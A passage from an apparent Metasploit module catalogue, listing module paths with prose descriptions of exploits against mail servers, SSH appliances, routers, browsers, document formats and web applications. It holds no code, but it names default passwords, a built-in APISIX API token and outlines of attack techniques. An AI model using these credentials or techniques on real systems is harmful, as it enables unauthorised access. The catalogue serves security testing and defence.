This module exploits a vulnerability that exists due to a lack of input validation when creating a user. Messages for a given user are stored in a directory partially defined by the username. By creating a user with a directory traversal payload as the username, commands can be written to a given directory. To use this module with the cron exploitation method, run the exploit using the given payload, host, and port. After running the exploit, the payload will be executed within 60 seconds. Due to differences in how cron may run in certain Linux operating systems such as Ubuntu, it may be preferable to set the target to Bash Completion as the cron method may not work. If the target is set to Bash completion, start a listener using the given payload, host, and port before running the exploit. After running the exploit, the payload will be executed when a user logs into the system. For this exploitation method, bash completion must be enabled to gain code execution. This exploitation method will leave an Apache James mail object artifact in the /etc/bash_completion.d directory and the malicious user account.

linux/smtp/exim4_dovecot_exec
This module exploits a command injection vulnerability against Dovecot with Exim using the "use_shell" option. It uses the sender's address to inject arbitrary commands, since this is one of the user-controlled variables. It has been successfully tested on Debian Squeeze using the default Exim4 with the dovecot-common packages.

linux/smtp/exim_gethostbyname_bof
This module remotely exploits CVE-2015-0235, aka GHOST, a heap-based buffer overflow in the GNU C Library's gethostbyname functions on x86 and x86_64 GNU/Linux systems that run the Exim mail server.

linux/smtp/haraka
The Haraka SMTP server comes with a plugin for processing attachments. Versions before 2.8.9 can be vulnerable to command injection

linux/snmp/awind_snmp_exec
This module exploits a vulnerability found in AwindInc and OEM'ed products where untrusted inputs are fed to ftpfw.sh system command, leading to command injection. A valid SNMP read-write community is required to exploit this vulnerability. The following devices are known to be affected by this issue: * Crestron Airmedia AM-100 <= version 1.5.0.4 * Crestron Airmedia AM-101 <= version 2.5.0.12 * Awind WiPG-1600w <= version 2.0.1.8 * Awind WiPG-2000d <= version 2.1.6.2 * Barco wePresent 2000 <= version 2.1.5.7 * Newline Trucast 2 <= version 2.1.0.5 * Newline Trucast 3 <= version 2.1.3.7

linux/snmp/net_snmpd_rw_access

linux/ssh/ceragon_fibeair_known_privkey
Ceragon ships a public/private key pair on FibeAir IP-10 devices that allows passwordless authentication to any other IP-10 device. Since the key is easily retrievable, an attacker can use it to gain unauthorized remote access as the "mateidu" user.

linux/ssh/cisco_ucs_scpuser
This module abuses a known default password on Cisco UCS Director. The 'scpuser' has the password of 'scpuser', and allows an attacker to login to the virtual appliance via SSH. This module has been tested with Cisco UCS Director virtual machines 6.6.0 and 6.7.0. Note that Cisco also mentions in their advisory that their IMC Supervisor and UCS Director Express are also affected by these vulnerabilities, but this module was not tested with those products.

linux/ssh/exagrid_known_privkey
ExaGrid ships a public/private key pair on their backup appliances to allow passwordless authentication to other ExaGrid appliances. Since the private key is easily retrievable, an attacker can use it to gain unauthorized remote access as root. Additionally, this module will attempt to use the default password for root, 'inflection'.

linux/ssh/f5_bigip_known_privkey
F5 ships a public/private key pair on BIG-IP appliances that allows passwordless authentication to any other BIG-IP box. Since the key is easily retrievable, an attacker can use it to gain unauthorized remote access as root.

linux/ssh/ibm_drm_a3user
This module abuses a known default password in IBM Data Risk Manager. The 'a3user' has the default password 'idrm' and allows an attacker to log in to the virtual appliance via SSH. This can be escalate to full root access, as 'a3user' has sudo access with the default password. At the time of disclosure this was an 0day, but it was later confirmed and patched by IBM. Versions <= 2.0.6.1 are confirmed to be vulnerable.

linux/ssh/loadbalancerorg_enterprise_known_privkey
Loadbalancer.org ships a public/private key pair on Enterprise virtual appliances version 7.5.2 that allows passwordless authentication to any other LB Enterprise box. Since the key is easily retrievable, an attacker can use it to gain unauthorized remote access as root.

linux/ssh/mercurial_ssh_exec
This module takes advantage of custom hg-ssh wrapper implementations that don't adequately validate parameters passed to the hg binary, allowing users to trigger a Python Debugger session, which allows arbitrary Python code execution.

linux/ssh/microfocus_obr_shrboadmin
This module abuses a known default password on Micro Focus Operations Bridge Reporter. The 'shrboadmin' user, installed by default by the product has the password of 'shrboadmin', and allows an attacker to login to the server via SSH. This module has been tested with Micro Focus Operations Bridge Manager 10.40. Earlier versions are most likely affected too. Note that this is only exploitable in Linux installations.

linux/ssh/quantum_dxi_known_privkey
Quantum ships a public/private key pair on DXi V1000 2.2.1 appliances that allows passwordless authentication to any other DXi box. Since the key is easily retrievable, an attacker can use it to gain unauthorized remote access as root.

linux/ssh/quantum_vmpro_backdoor
This module abuses a backdoor command in Quantum vmPRO. Any user, even one without admin privileges, can get access to the restricted SSH shell. By using the hidden backdoor "shell-escape" command it's possible to drop to a real root bash shell. This module has been tested successfully on Quantum vmPRO 3.1.2.

linux/ssh/solarwinds_lem_exec
This module exploits the default credentials of SolarWinds LEM. A menu system is encountered when the SSH service is accessed with the default username and password which is "cmc" and "password". By exploiting a vulnerability that exist on the menuing script, an attacker can escape from restricted shell. This module was tested against SolarWinds LEM v6.3.1.

linux/ssh/symantec_smg_ssh
This module exploits a default misconfiguration flaw on Symantec Messaging Gateway. The 'support' user has a known default password, which can be used to login to the SSH service, and gain privileged access from remote.

linux/ssh/vmware_vdp_known_privkey
VMware vSphere Data Protection appliances 5.5.x through 6.1.x contain a known ssh private key for the local user admin who is a sudoer without password.

linux/ssh/vmware_vrni_known_privkey
VMWare Aria Operations for Networks (vRealize Network Insight) versions 6.0.0 through 6.10.0 do not randomize the SSH keys on virtual machine initialization. Since the key is easily retrievable, an attacker can use it to gain unauthorized remote access as the "support" (root) user.

linux/ssh/vyos_restricted_shell_privesc
This module exploits command injection vulnerabilities and an insecure default sudo configuration on VyOS versions 1.0.0 <= 1.1.8 to execute arbitrary system commands as root. VyOS features a `restricted-shell` system shell intended for use by low privilege users with operator privileges. This module exploits a vulnerability in the `telnet` command to break out of the restricted shell, then uses sudo to exploit a command injection vulnerability in `/opt/vyatta/bin/sudo-users/vyatta-show-lldp.pl` to execute commands with root privileges. This module has been tested successfully on VyOS 1.1.8 amd64 and VyOS 1.0.0 i386.

linux/telnet/netgear_telnetenable
This module sends a magic packet to a NETGEAR device to enable telnetd. Upon successful connect, a root shell should be presented to the user.

linux/telnet/telnet_encrypt_keyid
This module exploits a buffer overflow in the encryption option handler of the Linux BSD-derived telnet service (inetutils or krb5-telnet). Most Linux distributions use NetKit-derived telnet daemons, so this flaw only applies to a small subset of Linux systems running telnetd.

linux/upnp/belkin_wemo_upnp_exec
This module exploits a command injection in the Belkin Wemo UPnP API via the SmartDevURL argument to the SetSmartDevInfo action. This module has been tested on a Wemo-enabled Crock-Pot, but other Wemo devices are known to be affected, albeit on a different RPORT (49153).

linux/upnp/dlink_dir859_exec_ssdpcgi
D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi.

linux/upnp/dlink_dir859_subscribe_exec
D-Link DIR-859 Routers are vulnerable to OS command injection via the UPnP interface. The vulnerability exists in /gena.cgi (function genacgi_main() in /htdocs/cgibin), which is accessible without credentials.

linux/upnp/dlink_upnp_msearch_exec
Different D-Link Routers are vulnerable to OS command injection via UPnP Multicast requests. This module has been tested on DIR-300 and DIR-645 devices. Zachary Cutlip has initially reported the DIR-815 vulnerable. Probably there are other devices also affected.

multi/browser/adobe_flash_pixel_bender_bof
This module exploits a buffer overflow vulnerability in Adobe Flash Player. The vulnerability occurs in the flash.Display.Shader class, when setting specially crafted data as its bytecode, as exploited in the wild in April 2014. This module has been tested successfully on the following operating systems and Flash versions: Windows 7 SP1, IE 8 to IE 11 with Flash 13.0.0.182, Windows 7 SP1, Firefox 38.0.5, Flash 11.7.700.275 and Adobe Flash 13.0.0.182, Windows 8.1, Firefox 38.0.5 and Adobe Flash 13.0.0.182, Linux Mint "Rebecca" (32 bit), Firefox 33.0 and Adobe Flash 11.2.202.350

multi/browser/adobe_flash_shader_drawing_fill
This module exploits a memory corruption happening when applying a Shader as a drawing fill as exploited in the wild on June 2015. This module has been tested successfully on: Windows 7 SP1 (32-bit), IE11 and Adobe Flash 17.0.0.188, Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 17.0.0.188, Windows 8.1, Firefox 38.0.5 and Adobe Flash 17.0.0.188, and Linux Mint "Rebecca" (32 bits), Firefox 33.0 and Adobe Flash 11.2.202.460.

multi/browser/adobe_flash_shader_job_overflow
This module exploits a buffer overflow vulnerability related to the ShaderJob workings on Adobe Flash Player. The vulnerability happens when trying to apply a Shader setting up the same Bitmap object as src and destination of the ShaderJob. Modifying the "width" attribute of the ShaderJob after starting the job it's possible to create a buffer overflow condition where the size of the destination buffer and the length of the copy are controlled. This module has been tested successfully on: Windows 7 SP1 (32-bit), IE11 and Adobe Flash 17.0.0.169, Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 17.0.0.169, Windows 8.1, Firefox 38.0.5 and Adobe Flash 17.0.0.169, and Linux Mint "Rebecca" (32 bits), Firefox 33.0 and Adobe Flash 11.2.202.457.

multi/browser/adobe_flash_uncompress_zlib_uaf
This module exploits a use after free vulnerability in Adobe Flash Player. The vulnerability occurs in the ByteArray::UncompressViaZlibVariant method, when trying to uncompress() a malformed byte stream. This module has been tested successfully on: * Windows 7 SP1 (32 bits), IE 8 to IE 11 and Flash 16.0.0.287, 16.0.0.257 and 16.0.0.235. * Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 16.0.0.287. * Windows 8.1, Firefox 38.0.5 and Adobe Flash 16.0.0.305. * Linux Mint "Rebecca" (32 bits), Firefox 33.0 and Flash 11.2.202.424.

multi/browser/chrome_array_map
This module exploits an issue in Chrome 73.0.3683.86 (64 bit). The exploit corrupts the length of a float in order to modify the backing store of a typed array. The typed array can then be used to read and write arbitrary memory. The exploit then uses WebAssembly in order to allocate a region of RWX memory, which is then replaced with the payload. The payload is executed within the sandboxed renderer process, so the browser must be run with the --no-sandbox option for the payload to work correctly.

multi/browser/chrome_cve_2021_21220_v8_insufficient_validation
This module exploits an issue in the V8 engine on x86_x64 builds of Google Chrome before 89.0.4389.128/90.0.4430.72 when handling XOR operations in JIT'd JavaScript code. Successful exploitation allows an attacker to execute arbitrary code within the context of the V8 process. As the V8 process is normally sandboxed in the default configuration of Google Chrome, the browser must be run with the --no-sandbox option for the payload to work correctly.

multi/browser/chrome_jscreate_sideeffect
This module exploits an issue in Google Chrome 80.0.3987.87 (64 bit). The exploit corrupts the length of a float array (float_rel), which can then be used for out of bounds read and write on adjacent memory. The relative read and write is then used to modify a UInt64Array (uint64_aarw) which is used for read and writing from absolute memory. The exploit then uses WebAssembly in order to allocate a region of RWX memory, which is then replaced with the payload shellcode. The payload is executed within the sandboxed renderer process, so the browser must be run with the --no-sandbox option for the payload to work correctly.

multi/browser/chrome_object_create
This modules exploits a type confusion in Google Chromes JIT compiler. The Object.create operation can be used to cause a type confusion between a PropertyArray and a NameDictionary. The payload is executed within the rwx region of the sandboxed renderer process. This module can target the renderer process (target 0), but Google Chrome must be launched with the --no-sandbox flag for the payload to execute successfully. Alternatively, this module can use CVE-2019-1458 to escape the renderer sandbox (target 1). This will only work on vulnerable versions of Windows (e.g Windows 7) and the exploit can only be triggered once. Additionally the exploit can cause the target machine to restart when the session is terminated. A BSOD is also likely to occur when the system is shut down or rebooted.

multi/browser/chrome_simplifiedlowering_overflow
This module exploits an issue in Google Chrome versions before 87.0.4280.88 (64 bit). The exploit makes use of an integer overflow in the SimplifiedLowering phase in turbofan. It is used along with a type hardening bypass using ArrayPrototypeShift to create a JSArray with a length of -1. This is abused to gain arbitrary read/write into the isolate region. Then an ArrayBuffer can be used to achieve absolute arbitrary read/write. The exploit then uses WebAssembly in order to allocate a region of RWX memory, which is then replaced with the payload shellcode. The payload is executed within the sandboxed renderer process, the browser must be run with the --no-sandbox option for the payload to work correctly.

multi/browser/firefox_escape_retval
This module exploits a memory corruption vulnerability in the Mozilla Firefox browser. This flaw occurs when a bug in the javascript interpreter fails to preserve the return value of the escape() function and results in uninitialized memory being used instead. This module has only been tested on Windows, but should work on other platforms as well with the current targets.

multi/browser/firefox_jit_use_after_free
This modules exploits CVE-2020-26950, a use after free exploit in Firefox. The MCallGetProperty opcode can be emitted with unmet assumptions resulting in an exploitable use-after-free condition. This exploit uses a somewhat novel technique of spraying ArgumentsData structures in order to construct primitives. The shellcode is forced into executable memory via the JIT compiler, and executed by writing to the JIT region pointer. This exploit does not contain a sandbox escape, so firefox must be run with the MOZ_DISABLE_CONTENT_SANDBOX environment variable set, in order for the shellcode to run successfully. This vulnerability affects Firefox < 82.0.3, Firefox ESR < 78.4.1, and Thunderbird < 78.4.2, however only Firefox <= 79 is supported as a target. Additional work may be needed to support other versions such as Firefox 82.0.1.

multi/browser/firefox_pdfjs_privilege_escalation
This module gains remote code execution on Firefox 35-36 by abusing a privilege escalation bug in resource:// URIs. PDF.js is used to exploit the bug. This exploit requires the user to click anywhere on the page to trigger the vulnerability.

multi/browser/firefox_proto_crmfrequest
On versions of Firefox from 5.0 to 15.0.1, the InstallTrigger global, when given invalid input, would throw an exception that did not have an __exposedProps__ property set. By re-setting this property on the exception object's prototype, the chrome-based defineProperty method is made available. With the defineProperty method, functions belonging to window and document can be overridden with a function that gets called from chrome-privileged context. From here, another vulnerability in the crypto.generateCRMFRequest function is used to "peek" into the context's private scope. Since the window does not have a chrome:// URL, the insecure parts of Components.classes are not available, so instead the AddonManager API is invoked to silently install a malicious plugin.

multi/browser/firefox_proxy_prototype
This exploit gains remote code execution on Firefox 31-34 by abusing a bug in the XPConnect component and gaining a reference to the privileged chrome:// window. This exploit requires the user to click anywhere on the page to trigger the vulnerability.

multi/browser/firefox_queryinterface
This module exploits a code execution vulnerability in the Mozilla Firefox browser. To reliably exploit this vulnerability, we need to fill almost a gigabyte of memory with our nop sled and payload. This module has been tested on OS X 10.3 with the stock Firefox 1.5.0 package.

multi/browser/firefox_svg_plugin
This exploit gains remote code execution on Firefox 17 and 17.0.1, provided the user has installed Flash. No memory corruption is used. First, a Flash object is cloned into the anonymous content of the SVG "use" element in the <body> (CVE-2013-0758). From there, the Flash object can navigate a child frame to a URL in the chrome:// scheme. Then a separate exploit (CVE-2013-0757) is used to bypass the security wrapper around the child frame's window reference and inject code into the chrome:// context. Once we have injection into the chrome execution context, we can write the payload to disk, chmod it (if posix), and then execute. Note: Flash is used here to trigger the exploit but any Firefox plugin with script access should be able to trigger it.

multi/browser/firefox_tostring_console_injection
This exploit gains remote code execution on Firefox 15-22 by abusing two separate Javascript-related vulnerabilities to ultimately inject malicious Javascript code into a context running with chrome:// privileges.

multi/browser/firefox_webidl_injection
This exploit gains remote code execution on Firefox 22-27 by abusing two separate privilege escalation vulnerabilities in Firefox's Javascript APIs.

multi/browser/firefox_xpi_bootstrapped_addon
Mozilla Firefox before version 41 allowed users to install unsigned browser extensions from arbitrary web servers. This module dynamically creates an unsigned .xpi addon file. The resulting bootstrapped Firefox addon is presented to the victim via a web page. The victim's Firefox browser will pop a dialog asking if they trust the addon. Once the user clicks "install", the addon is installed and executes the payload with full user permissions. As of Firefox 4, this will work without a restart as the addon is marked to be "bootstrapped". As the addon will execute the payload after each Firefox restart, an option can be given to automatically uninstall the addon once the payload has been executed. As of Firefox 41, unsigned extensions can still be installed on Firefox Nightly, Unbranded and Development builds when configured with `xpinstall.signatures.required` set to `false`. Note: this module generates legacy extensions which are supported only in Firefox before version 57.

multi/browser/itms_overflow
This modules exploits a stack-based buffer overflow in iTunes itms:// URL parsing. It is accessible from the browser and in Safari, itms urls will be opened in iTunes automatically. Because iTunes is multithreaded, only vfork-based payloads should be used.

multi/browser/java_atomicreferencearray
This module exploits a vulnerability due to the fact that AtomicReferenceArray uses the Unsafe class to store a reference in an array directly, which may violate type safety if not used properly. This allows a way to escape the JRE sandbox, and load additional classes in order to perform malicious operations.

multi/browser/java_calendar_deserialize
This module exploits a flaw in the deserialization of Calendar objects in the Sun JVM. The payload can be either a native payload which is generated as an executable and dropped/executed on the target or a shell from within the Java applet in the target browser. The affected Java versions are JDK and JRE 6 Update 10 and earlier, JDK and JRE 5.0 Update 16 and earlier, SDK and JRE 1.4.2_18 and earlier (SDK and JRE 1.3.1 are not affected).

multi/browser/java_getsoundbank_bof
This module exploits a flaw in the getSoundbank function in the Sun JVM. The payload is serialized and passed to the applet via PARAM tags. It must be a native payload. The effected Java versions are JDK and JRE 6 Update 16 and earlier, JDK and JRE 5.0 Update 21 and earlier, SDK and JRE 1.4.2_23 and earlier, and SDK and JRE 1.3.1_26 and earlier. NOTE: Although all of the above versions are reportedly vulnerable, only 1.6.0_u11 and 1.6.0_u16 on Windows XP SP3 were tested.

multi/browser/java_jre17_driver_manager
This module abuses the java.sql.DriverManager class where the toString() method is called over user supplied classes from a doPrivileged block. The vulnerability affects Java version 7u17 and earlier. This exploit bypasses click-to-play on Internet Explorer and throws a specially crafted JNLP file. This bypass is applicable mainly to IE, where Java Web Start can be launched automatically through the ActiveX control. Otherwise, the applet is launched without click-to-play bypass.

multi/browser/java_jre17_exec
The exploit takes advantage of two issues in JDK 7: The ClassFinder and MethodFinder.findMethod(). Both were newly introduced in JDK 7. ClassFinder is a replacement for classForName back in JDK 6. It allows untrusted code to obtain a reference and have access to a restricted package in JDK 7, which can be used to abuse sun.awt.SunToolkit (a restricted package). With sun.awt.SunToolkit, we can actually invoke getField() by abusing findMethod() in Statement.invokeInternal() (but getField() must be public, and that's not always the case in JDK 6) in order to access Statement.acc's private field, modify AccessControlContext, and then disable Security Manager. Once Security Manager is disabled, we can execute arbitrary Java code. Our exploit has been tested successfully against multiple platforms, including: IE, Firefox, Safari, Chrome; Windows, Ubuntu, OS X, Solaris, etc.

multi/browser/java_jre17_glassfish_averagerangestatisticimpl
This module abuses the AverageRangeStatisticImpl from a Java Applet to run arbitrary Java code outside of the sandbox, a different exploit vector than the one exploited in the wild in November of 2012. The vulnerability affects Java version 7u7 and earlier.

multi/browser/java_jre17_jaxws
This module abuses the JAX-WS classes from a Java Applet to run arbitrary Java code outside of the sandbox as exploited in the wild in November of 2012. The vulnerability affects Java version 7u7 and earlier.

multi/browser/java_jre17_jmxbean
This module abuses the JMX classes from a Java Applet to run arbitrary Java code outside of the sandbox as exploited in the wild in January of 2013. The vulnerability affects Java version 7u10 and earlier.

multi/browser/java_jre17_jmxbean_2
This module abuses the JMX classes from a Java Applet to run arbitrary Java code outside of the sandbox as exploited in the wild in February of 2013. Additionally, this module bypasses default security settings introduced in Java 7 Update 10 to run unsigned applet without displaying any warning to the user.

multi/browser/java_jre17_method_handle
This module abuses the Method Handle class from a Java Applet to run arbitrary Java code outside of the sandbox. The vulnerability affects Java version 7u7 and earlier.

multi/browser/java_jre17_provider_skeleton
This module abuses the insecure invoke() method of the ProviderSkeleton class that allows to call arbitrary static methods with user supplied arguments. The vulnerability affects Java version 7u21 and earlier.

multi/browser/java_jre17_reflection_types
This module abuses Java Reflection to generate a Type Confusion, due to a weak access control when setting final fields on static classes, and run code outside of the Java Sandbox. The vulnerability affects Java version 7u17 and earlier. This exploit bypasses click-to-play throw a specially crafted JNLP file. This bypass is applied mainly to IE, when Java Web Start can be launched automatically throw the ActiveX control. Otherwise the applet is launched without click-to-play bypass.

multi/browser/java_rhino
This module exploits a vulnerability in the Rhino Script Engine that can be used by a Java Applet to run arbitrary Java code outside of the sandbox. The vulnerability affects version 7 and version 6 update 27 and earlier, and should work on any browser that supports Java (for example: IE, Firefox, Google Chrome, etc)

multi/browser/java_rmi_connection_impl
This module exploits a vulnerability in the Java Runtime Environment that allows to deserialize a MarshalledObject containing a custom classloader under a privileged context. The vulnerability affects version 6 prior to update 19 and version 5 prior to update 23.

multi/browser/java_setdifficm_bof
This module exploits a flaw in the setDiffICM function in the Sun JVM. The payload is serialized and passed to the applet via PARAM tags. It must be a native payload. The effected Java versions are JDK and JRE 6 Update 16 and earlier, JDK and JRE 5.0 Update 21 and earlier, SDK and JRE 1.4.2_23 and earlier, and SDK and JRE 1.3.1_26 and earlier. NOTE: Although all of the above versions are reportedly vulnerable, only 1.6.0_u11 and 1.6.0_u16 on Windows XP SP3 were tested.

multi/browser/java_signed_applet
This exploit dynamically creates a .jar file via the Msf::Exploit::Java mixin, then signs the it. The resulting signed applet is presented to the victim via a web page with an applet tag. The victim's JVM will pop a dialog asking if they trust the signed applet. On older versions the dialog will display the value of CERTCN in the "Publisher" line. Newer JVMs display "UNKNOWN" when the signature is not trusted (i.e., it's not signed by a trusted CA). The SigningCert option allows you to provide a trusted code signing cert, the values in which will override CERTCN. If SigningCert is not given, a randomly generated self-signed cert will be used. Either way, once the user clicks "run", the applet executes with full user permissions.

multi/browser/java_storeimagearray
This module abuses an Invalid Array Indexing Vulnerability on the static function storeImageArray() function in order to cause a memory corruption and escape the Java Sandbox. The vulnerability affects Java version 7u21 and earlier. The module, which doesn't bypass click2play, has been tested successfully on Java 7u21 on Windows and Linux systems.

multi/browser/java_trusted_chain
This module exploits a vulnerability in Java Runtime Environment that allows an untrusted method to run in a privileged context. The vulnerability affects version 6 prior to update 19 and version 5 prior to update 23.

multi/browser/java_verifier_field_access
This module exploits a vulnerability in HotSpot bytecode verifier where an invalid optimization of GETFIELD/PUTFIELD/GETSTATIC/PUTSTATIC instructions leads to insufficient type checks. This allows a way to escape the JRE sandbox, and load additional classes in order to perform malicious operations.

multi/browser/mozilla_compareto
This module exploits a code execution vulnerability in the Mozilla Suite, Mozilla Firefox, and Mozilla Thunderbird applications. This exploit module is a direct port of Aviv Raff's HTML PoC.

multi/browser/mozilla_navigatorjava
This module exploits a code execution vulnerability in the Mozilla Suite, Mozilla Firefox, and Mozilla Thunderbird applications. This exploit requires the Java plugin to be installed.

multi/browser/msfd_rce_browser
Metasploit's msfd-service makes it possible to get a msfconsole-like interface over a TCP socket. This module connects to the msfd-socket through the victim's browser. To execute msfconsole-commands in JavaScript from a web application, this module places the payload in the POST-data. These POST-requests can be sent cross-domain and can therefore be sent to localhost on the victim's machine. The msfconsole-command to execute code is 'rbi -e "CODE"'. Exploitation when the browser is running on Windows is unreliable and the exploit is only usable when IE is used and the quiet-flag has been passed to msf-daemon.

multi/browser/opera_configoverwrite
Opera web browser in versions <= 9.10 allows unrestricted script access to its configuration page, opera:config, allowing an attacker to change settings and potentially execute arbitrary code.

multi/browser/opera_historysearch
Certain constructs are not escaped correctly by Opera's History Search results. These can be used to inject scripts into the page, which can then be used to modify configuration settings and execute arbitrary commands. Affects Opera versions between 9.50 and 9.61.

multi/browser/qtjava_pointer
This module exploits an arbitrary memory access vulnerability in the Quicktime for Java API provided with Quicktime 7.

multi/elasticsearch/script_mvel_rce
This module exploits a remote command execution (RCE) vulnerability in ElasticSearch, exploitable by default on ElasticSearch prior to 1.2.0. The bug is found in the REST API, which does not require authentication, where the search function allows dynamic scripts execution. It can be used for remote attackers to execute arbitrary Java code. This module has been tested successfully on ElasticSearch 1.1.1 on Ubuntu Server 12.04 and Windows XP SP3.

multi/elasticsearch/search_groovy_script
This module exploits a remote command execution (RCE) vulnerability in ElasticSearch, exploitable by default on ElasticSearch prior to 1.4.3. The bug is found in the REST API, which does not require authentication, where the search function allows groovy code execution and its sandbox can be bypassed using java.lang.Math.class.forName to reference arbitrary classes. It can be used to execute arbitrary Java code. This module has been tested successfully on ElasticSearch 1.4.2 on Ubuntu Server 12.04.

multi/fileformat/adobe_u3d_meshcont
This module exploits an array overflow in Adobe Reader and Adobe Acrobat. Affected versions include < 7.1.4, < 8.1.7, and < 9.2. By creating a specially crafted pdf that a contains malformed U3D data, an attacker may be able to execute arbitrary code.

multi/fileformat/archive_tar_arb_file_write
This module takes advantages of Archive_Tar <= 1.4.10's lack of validation of file stream wrappers contained within filenames to write an arbitrary file containing user controlled content to an arbitrary file on disk. Note that the file will be written to disk with the permissions of the user that PHP is running as, so it may not be possible to overwrite some files if the PHP user is not appropriately privileged.

multi/fileformat/evince_cbt_cmd_injection
This module exploits a command injection vulnerability in Evince before version 3.24.1 when opening comic book `.cbt` files. Some file manager software, such as Nautilus and Atril, may allow automatic exploitation without user interaction due to thumbnailer preview functionality. Note that limited space is available for the payload (<256 bytes). Reverse Bash and Reverse Netcat payloads should be sufficiently small. This module has been tested successfully on evince versions: 3.4.0-3.1 + nautilus 3.4.2-1+build1 on Kali 1.0.6; 3.18.2-1ubuntu4.3 + atril 1.12.2-1ubuntu0.3 on Ubuntu 16.04.

multi/fileformat/ghostscript_failed_restore
This module exploits a -dSAFER bypass in Ghostscript to execute arbitrary commands by handling a failed restore (grestore) in PostScript to disable LockSafetyParams and avoid invalidaccess. This vulnerability is reachable via libraries such as ImageMagick.

multi/fileformat/js_unpacker_eval_injection
This module generates a Javascript file that executes arbitrary code when an eval-based unpacker is run on it. Works against js-beautify's P_A_C_K_E_R unpacker.

multi/fileformat/libreoffice_logo_exec
LibreOffice comes bundled with sample macros written in Python and allows the ability to bind program events to them. LibreLogo is a macro that allows a program event to execute text as Python code, allowing RCE. This module generates an ODT file with a dom loaded event that, when triggered, will execute arbitrary python code and the metasploit payload.

multi/fileformat/libreoffice_macro_exec
LibreOffice comes bundled with sample macros written in Python and allows the ability to bind program events to them. A macro can be tied to a program event by including the script that contains the macro and the function name to be executed. Additionally, a directory traversal vulnerability exists in the component that references the Python script to be executed. This allows a program event to execute functions from Python scripts relative to the path of the samples macros folder. The pydoc.py script included with LibreOffice contains the tempfilepager function that passes arguments to os.system, allowing RCE. This module generates an ODT file with a mouse over event that when triggered, will execute arbitrary code.

multi/fileformat/maple_maplet
This module harnesses Maple's ability to create files and execute commands automatically when opening a Maplet. All versions up to 13 are suspected vulnerable. Testing was conducted with version 13 on Windows. Standard security settings prevent code from running in a normal maple worksheet without user interaction, but those setting do not prevent code in a Maplet from running. In order for the payload to be executed, an attacker must convince someone to open a specially modified .maplet file with Maple. By doing so, an attacker can execute arbitrary code as the victim user.

multi/fileformat/nodejs_js_yaml_load_code_exec
This module can be used to abuse node.js applications that parse user-supplied YAML input using the load() function from the 'js-yaml' package < 2.0.5, which doesn't properly handle the unsafe !!js/function tag, allowing to specify a self-executing function which results on execution of arbitrary javascript code.

multi/fileformat/office_word_macro
This module injects a malicious macro into a Microsoft Office Word document (docx). The comments field in the metadata is injected with a Base64 encoded payload, which will be decoded by the macro and execute as a Windows executable. For a successful attack, the victim is required to manually enable macro execution.

multi/fileformat/peazip_command_injection
This module exploits a command injection vulnerability in PeaZip. All versions prior to 2.6.2 are suspected vulnerable. Testing was conducted with version 2.6.1 on Windows. In order for the command to be executed, an attacker must convince someone to open a specially crafted zip file with PeaZip, and access the specially file via double-clicking it. By doing so, an attacker can execute arbitrary commands as the victim user.

multi/fileformat/swagger_param_inject
This module generates an Open API Specification 2.0 (Swagger) compliant json document that includes payload insertion points in parameters. In order for the payload to be executed, an attacker must convince someone to generate code from a specially modified swagger.json file within a vulnerable swagger-codgen appliance/container/api/service, and then to execute that generated code (or include it into software which will later be executed by another victim). By doing so, an attacker can execute arbitrary code as the victim user. The same vulnerability exists in the YAML format.

multi/fileformat/zip_slip
This is a generic arbitrary file overwrite technique, which typically results in remote command execution. This targets a simple yet widespread vulnerability that has been seen affecting a variety of popular products including HP, Amazon, Apache, Cisco, etc. The idea is that often archive extraction libraries have no mitigations against directory traversal attacks. If an application uses it, there is a risk when opening an archive that is maliciously modified, and result in the embedded payload to be written to an arbitrary location (such as a web root), and result in remote code execution.

multi/ftp/pureftpd_bash_env_exec
This module exploits the Shellshock vulnerability, a flaw in how the Bash shell handles external environment variables. This module targets the Pure-FTPd FTP server when it has been compiled with the --with-extauth flag and an external Bash script is used for authentication. If the server is not set up this way, the exploit will fail, even if the version of Bash in use is vulnerable.

multi/ftp/wuftpd_site_exec_format
This module exploits a format string vulnerability in versions of the Washington University FTP server older than 2.6.1. By executing specially crafted SITE EXEC or SITE INDEX commands containing format specifiers, an attacker can corrupt memory and execute arbitrary code.

multi/http/apache_apisix_api_default_token_rce
Apache APISIX has a default, built-in API token edd1c9f034335f136f87ad84b625c8f1 that can be used to access all of the admin API, which leads to remote LUA code execution through the script parameter added in the 2.x version. This module also leverages another vulnerability to bypass the IP restriction plugin.

multi/http/apache_couchdb_erlang_rce
In Apache CouchDB prior to 3.2.2, an attacker can access an improperly secured default installation without authenticating and gain admin privileges.

multi/http/apache_druid_cve_2023_25194
This module is designed to exploit the JNDI injection vulnerability in Druid. The vulnerability specifically affects the indexer/v1/sampler interface of Druid, enabling an attacker to execute arbitrary commands on the targeted server. The vulnerability is found in Apache Kafka clients versions ranging from 2.3.0 to 3.3.2. If an attacker can manipulate the sasl.jaas.config property of any of the connector's Kafka clients to com.sun.security.auth.module.JndiLoginModule, it allows the server to establish a connection with the attacker's LDAP server and deserialize the LDAP response. This provides the attacker with the capability to execute java deserialization gadget chains on the Kafka connect server, potentially leading to unrestricted deserialization of untrusted data or even remote code execution (RCE) if there are relevant gadgets in the classpath. To facilitate the exploitation process, this module will initiate an LDAP server that the target server needs to connect to in order to carry out the attack.

multi/http/apache_flink_jar_upload_exec
This module uses job functionality in Apache Flink dashboard web interface to upload and execute a JAR file, leading to remote execution of arbitrary Java code as the web server user.

multi/http/atlassian_confluence_namespace_ognl_injection
This module exploits an OGNL injection in Atlassian Confluence servers. A specially crafted URI can be used to evaluate an OGNL expression resulting in OS command execution.

multi/http/atlassian_confluence_rce_cve_2023_22515
This module exploits an improper input validation issue in Atlassian Confluence, allowing arbitrary HTTP parameters to be translated into getter/setter sequences via the XWorks2 middleware and in turn allows for Java objects to be modified at run time. The exploit will create a new administrator user and upload a malicious plugins to get arbitrary code execution. All versions of Confluence between 8.0.0 through to 8.3.2, 8.4.0 through to 8.4.2, and 8.5.0 through to 8.5.1 are affected.

multi/http/atlassian_confluence_webwork_ognl_injection
This module exploits an OGNL injection in Atlassian Confluence's WebWork component to execute commands as the Tomcat user.

multi/http/atlassian_crowd_pdkinstall_plugin_upload_rce
This module can be used to upload a plugin on Atlassian Cloud via the pdkinstall development plugin as an unauthenticated attacker. The payload is uploaded as a JAR archive containing a servlet using a POST request to /crowd/admin/uploadplugin.action. The check command will check that the /crowd/admin/uploadplugin.action page exists and that it responds appropriately to determine if the target is vulnerable or not.

